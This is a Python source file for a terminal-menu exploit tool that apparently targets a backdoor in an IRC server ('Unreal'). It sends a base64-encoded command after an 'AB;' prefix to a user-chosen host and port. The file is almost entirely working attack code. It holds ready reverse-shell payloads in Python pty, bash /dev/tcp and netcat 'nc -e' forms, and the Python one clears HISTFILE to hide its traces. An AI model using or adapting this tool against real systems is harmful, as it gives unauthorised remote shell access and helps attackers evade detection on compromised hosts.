import npyscreen,socket,base64


def ModExploit(unreal_ip, unreal_port, unreal_payload):
  local_ip = "127.0.0.1"
  local_port = 1337
  python_payload = f'python -c "import os;import pty;import socket;tLnCwQLCel=\'{local_ip}\';EvKOcV={local_port};QRRCCltJB=socket.socket(socket.AF_INET,socket.SOCK_STREAM);QRRCCltJB.connect((tLnCwQLCel,EvKOcV));os.dup2(QRRCCltJB.fileno(),0);os.dup2(QRRCCltJB.fileno(),1);os.dup2(QRRCCltJB.fileno(),2);os.putenv(\'HISTFILE\',\'/dev/null\');pty.spawn(\'/bin/bash\');QRRCCltJB.close();" '
  bash_payload = f'bash -i >& /dev/tcp/{local_ip}/{local_port} 0>&1'
  netcat_payload = f'nc -e /bin/bash {local_ip} {local_port}'

  # our socket to interact with and send payload
  try:
      s = socket.create_connection((unreal_ip, unreal_port))
  except socket.error as error:
      print('connection to target failed...')
      print(error)

  # craft out payload and then it gets base64 encoded
  def gen_payload(payload_type):
      base = base64.b64encode(payload_type.encode())
      return f'echo {base.decode()} |base64 -d|/bin/bash'

  # all the different payload options to be sent
  if unreal_payload == 'python':
      try:
          s.sendall((f'AB; {gen_payload(python_payload)} \n').encode())
      except:
          print('connection made, but failed to send exploit...')

  if unreal_payload == 'netcat':
      try:
          s.sendall((f'AB; {gen_payload(netcat_payload)} \n').encode())
      except:
          print('connection made, but failed to send exploit...')

  if unreal_payload == 'bash':
      try:
          s.sendall((f'AB; {gen_payload(bash_payload)} \n').encode())
      except:
          print('connection made, but failed to send exploit...')

  #check display any response from the server
  data = s.recv(1024)
  s.close()
  if data != '':
      print('Exploit sent successfully!')
class Button(npyscreen.ButtonPress):
  def whenPressed(self):
    change_to = "Unreal"
    self.parent.parentApp.change_form(change_to)
class Form(npyscreen.ActionForm):
  def create(self):
    self.ip = self.add(npyscreen.TitleText, name = "Enter IP:",editable=True )
    self.port = self.add(npyscreen.TitleText, name = "Target Port:",editable=True)
    self.type = self.add(npyscreen.TitleSelectOne, max_height=4, value = [0,], name="Select Type of Rev Shell", values = ["bash","netcat","python"], scroll_exit=True)
  def on_ok(self):
        try:# Exit the application if the OK button is pressed.
          exploit = ModExploit
          exploit(self.ip.value,self.port.value,self.type.get_selected_objects()[0])
          npyscreen.notify_confirm(f"exploit sent to {self.ip.value}")
        except:
          npyscreen.notify_confirm(f"Failed to Connect to Target")
        self.parentApp.switchForm("MAIN")
